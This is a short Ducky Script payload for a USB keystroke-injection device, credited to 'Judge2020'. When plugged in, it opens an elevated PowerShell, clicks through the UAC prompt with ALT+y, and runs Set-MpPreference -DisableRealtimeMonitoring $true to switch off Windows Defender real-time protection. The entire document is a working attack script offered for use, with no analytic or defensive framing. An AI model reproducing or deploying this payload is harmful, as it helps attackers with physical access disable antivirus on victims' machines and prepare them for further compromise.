REM Windows defender can be disabled with PS using the following command ps
REM Set-MpPreference -DisableRealtimeMonitoring $true
```

REM An example script: 

```
REM Windows 10: Disable Windows Defender with Powershell
REM Author: Judge2020
REM author website: Judge2020.com
REM  
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
STRING exit
ENTER
```
